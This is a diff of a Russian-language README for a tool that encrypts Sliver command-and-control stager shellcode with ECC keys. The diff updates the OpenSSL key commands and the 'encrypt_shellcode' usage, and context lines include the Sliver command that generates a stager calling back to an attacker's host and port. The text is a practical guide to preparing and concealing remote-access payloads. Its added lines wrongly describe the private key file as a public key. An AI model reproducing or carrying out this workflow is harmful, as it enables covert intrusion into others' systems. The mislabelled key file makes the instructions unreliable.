@@ -26,13 +26,13 @@ sliver> generate stager --lhost ip --lport 8443 --arch amd64 --format shellcode
 
 При необходимости вы также можете использовать дополнительные параметры.
 
-Сгенерируйте **.pem** ключи с помощью OpenSSL:
+Сгенерируйте **.pem** ключи с помощью OpenSSL(prime256v1):
 
 ```bash
-openssl ecparam -name prime256v1 -genkey -noout -out ecc-key.pem
+openssl ecparam -genkey -name prime256v1 -out new-ecc-private.pem
 ```
 ```bash
-openssl ec -in ecc-key.pem -pubout -out ecc-public.pem
+openssl ec -in new-ecc-private.pem -pubout -out new-ecc-public.pem
 ```
 
 Клонируйте репозиторий с кодом для шифрования:
@@ -55,14 +55,16 @@ g++ ec_encoder.cpp -o encrypt_shellcode -lcrypto
 **Запустите программу для шифрования:**
 
 ```bash
-./encrypt_shellcode shellcode.bin ecc-public.pem
+./encrypt_shellcode shellcode.bin new-ecc-private.pem new-ecc-public.pem
 ```
 
 Где:
 
 **shellcode.bin** - это файл с shellcode, полученный из Sliver (имя может отличаться).
 
-**ecc-public.pem** - это открытый ключ.
+**new-ecc-private.pem** - это открытый ключ.
+
+**new-ecc-public.pem** - это открытый ключ.
 
 ## Как использовать это в реальном проекте ##
 
